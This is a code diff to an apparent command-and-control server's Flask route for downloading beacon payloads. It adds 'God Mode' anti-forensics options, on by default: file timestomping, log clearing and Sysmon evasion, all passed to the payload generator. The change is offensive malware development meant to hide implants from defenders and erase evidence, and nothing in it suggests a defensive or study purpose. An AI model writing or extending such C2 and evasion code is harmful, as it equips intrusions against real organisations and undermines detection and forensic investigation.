@@ -274,7 +274,7 @@ def generate_payload():
 
 @beacon_bp.route("/c2/payloads/download/<payload_type>", methods=["GET"])
 def download_payload(payload_type: str):
-    """Download raw payload file"""
+    """Download raw payload file with God Mode anti-forensics"""
     if not session.get("logged_in"):
         return jsonify({"error": "unauthorized"}), 401
     
@@ -282,8 +282,21 @@ def download_payload(payload_type: str):
     sleep = int(request.args.get("sleep", 30))
     jitter = int(request.args.get("jitter", 10))
     
+    # Extract God Mode options from query params (default: enabled)
+    god_mode_enabled = request.args.get("god_mode", "true").lower() == "true"
+    god_mode_options = {
+        "enabled": god_mode_enabled,
+        "timestomp": request.args.get("timestomp", "true").lower() == "true" if god_mode_enabled else False,
+        "clean_logs": request.args.get("clean_logs", "true").lower() == "true" if god_mode_enabled else False,
+        "sysmon_evade": request.args.get("sysmon_evade", "true").lower() == "true" if god_mode_enabled else False,
+    }
+    
     generator = get_payload_generator(c2_url)
-    payload = generator.generate(payload_type, {"sleep": sleep, "jitter": jitter})
+    payload = generator.generate(payload_type, {
+        "sleep": sleep, 
+        "jitter": jitter,
+        "god_mode": god_mode_options
+    })
     
     # Determine file extension
     extensions = {
